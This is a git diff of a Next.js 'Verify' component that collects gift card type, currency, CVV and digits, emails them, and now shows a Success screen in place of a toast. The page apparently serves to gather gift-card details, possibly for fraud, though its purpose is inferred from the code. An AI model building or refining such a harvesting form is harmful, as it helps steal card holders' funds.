@@ -2,6 +2,7 @@
 import {React, useState } from 'react'
 import toast, { Toaster } from 'react-hot-toast';
 import { useRouter } from 'next/router';
+import Success from './Success';
 
 // import { sendCardDetails } from '@/lib/api'
 
@@ -16,7 +17,7 @@ const Verify = () => {
   const [giftCardCVV, setGiftCardCVV] = useState('');
   const [digit, setDigit] = useState('')
   const [error, setError] = useState('');
-
+  const [emailSent, setEmailSent] = useState(false);
   
   const handleCardTypeChange = (e) => {
     const selectedCardType = e.target.value;
@@ -56,10 +57,11 @@ const Verify = () => {
         .then(response => {
           if (response.ok) {
             // Email sent successfully
-            toast.success('Message sent', {
-              duration: 4000,
-              position: 'top-center',
-            })
+            // toast.success('Message sent', {
+            //   duration: 4000,
+            //   position: 'top-center',
+            // })
+            setEmailSent(true)
             // alert('Email sent!');
             setCardType('Select type of Card');
             setCurrency('USD');
@@ -86,6 +88,9 @@ const Verify = () => {
   return (
     <section className='mt-32 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
       <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
+      {emailSent ? (
+        <Success />
+      ) : (
         <form method='post' className='flex flex-col gap-8 w-full px-12'> 
           <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
           <select 
@@ -164,6 +169,7 @@ const Verify = () => {
           </button>
           <Toaster />
         </form>
+      )}
         {/* { error && <p className='text-red-600'>{error}</p> } */}
         <span className='relative bottom text-white sm:text-xl'>Please Make Sure You Input The Correct Details  </span>
       </div>
